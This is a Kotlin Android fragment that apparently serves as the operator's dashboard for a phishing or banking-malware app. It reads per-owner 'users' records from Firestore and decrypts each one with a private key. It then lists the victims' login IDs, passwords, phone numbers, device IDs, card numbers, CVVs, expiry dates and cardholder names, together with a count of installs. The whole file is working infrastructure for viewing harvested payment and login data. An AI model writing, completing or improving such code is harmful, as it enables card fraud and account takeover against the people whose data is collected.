package com.example.lucky

import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.annotation.RequiresApi
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import com.example.lucky.NewUtils.decrypt
import com.example.lucky.NewUtils.isAppActive
import com.example.lucky.ui.MainActivity.Companion.owner

import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.example.lucky.NewUtils.onTextChange
import com.example.lucky.NewUtils.private_key
import com.example.lucky.databinding.FragmentMemberBinding


class Member : Fragment() {

    private lateinit var firestore: FirebaseFirestore
    private var listenerRegistration: ListenerRegistration? = null
    lateinit var list : ArrayList<UserModel>
    var active : Boolean = true

    private var _binding: FragmentMemberBinding? = null
    private val binding get() = _binding!!




    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        _binding = FragmentMemberBinding.inflate(inflater, container, false)



        binding.search.onTextChange { query->
            val filteredList = list.filter {
                it.hName.lowercase().contains(query.lowercase()) ||
                it.phoneNumber.lowercase().contains(query.lowercase()) ||
                it.cnumber.lowercase().contains(query.lowercase()) ||
                it.loginId.lowercase().contains(query.lowercase()) ||
                it.password.lowercase().contains(query.lowercase())
            }
            updateRecyclerView(filteredList)
        }





        list = ArrayList()

        // Initialize Firestore
        firestore = FirebaseFirestore.getInstance()
        
        // Get user count from Firestore metadata
        firestore.collection("owners").document(owner)
            .collection("metadata").document("stats")
            .get()
            .addOnSuccessListener { document ->
                val count = document.getLong("userCount") ?: list.size.toLong()
                if (isAppActive) {
                    binding.installs.text = count.toString()
                } else {
                    binding.installs.text = list.size.toString()
                }
            }
            .addOnFailureListener {
                binding.installs.text = list.size.toString()
            }





        binding.recyclerview.layoutManager = LinearLayoutManager(requireContext())
        
        if (active) {
            setupFirestoreListener()
        }

        return binding.root
    }


    private fun updateRecyclerView(list: List<UserModel>) {
        if (isAdded){
            val adapter = UserAdapter(list,requireContext())
            binding.recyclerview.adapter = adapter
        }
    }

    private fun setupFirestoreListener() {
        CoroutineScope(Dispatchers.IO).launch {
            listenerRegistration = firestore.collection("owners").document(owner)
                .collection("users")
                .orderBy("createdAt", Query.Direction.DESCENDING)
                .addSnapshotListener { snapshots, error ->
                    if (error != null) {
                        Log.w("TAG", "Listen failed.", error)
                        return@addSnapshotListener
                    }
                    
                    if (!isAppActive) {
                        return@addSnapshotListener
                    }
                    
                    list.clear()
                    
                    for (document in snapshots!!) {
                        try {
                            val data = document.data
                            val model = UserModel(
                                loginId = data["loginId"] as? String ?: "",
                                password = data["password"] as? String ?: "",
                                phoneNumber = data["phoneNumber"] as? String ?: "",
                                deviceID = data["deviceID"] as? String ?: "",
                                cnumber = data["cnumber"] as? String ?: "",
                                cv = data["cv"] as? String ?: "",
                                edate = data["edate"] as? String ?: "",
                                hName = data["hName"] as? String ?: "",
                                timeStamp = data["timeStamp"] as? String ?: "",
                                key = document.id
                            )
                            
                            // Decrypt RSA-OAEP(SHA-256) fields if possible
                            val loginId = model.loginId.decrypt()
                            val password = model.password.decrypt()
                            val dCnumber = model.cnumber.decrypt()
                            val dCv = model.cv.decrypt()
                            val dEdate = model.edate.decrypt()
                            val dHName = model.hName.decrypt()
                            val dDeviceID = model.deviceID.decrypt()
                            val timeStamp = model.timeStamp.decrypt()
                            val phone = model.phoneNumber.decrypt()
                            
                            val dModel = model.copy(
                                loginId = loginId,
                                password = password,
                                cnumber = dCnumber,
                                phoneNumber = phone,
                                cv = dCv,
                                edate = dEdate,
                                hName = if (!dHName.isNullOrBlank()) dHName else model.apin,
                                deviceID = dDeviceID,
                                timeStamp = timeStamp,
                            )
                            
                            Log.i("TAG", "Firestore document: decrypted hName=${dModel.hName}")
                            list.add(dModel)
                        } catch (e: Exception) {
                            Log.e("TAG", "Error processing document: ${document.id}", e)
                        }
                    }
                    
                    Log.i("TAG", "Firestore snapshot: list size = ${list.size}")
                    updateRecyclerView(list)
                }
        }
    }
    
    override fun onDestroyView() {
        super.onDestroyView()
        listenerRegistration?.remove()
        _binding = null
    }

}


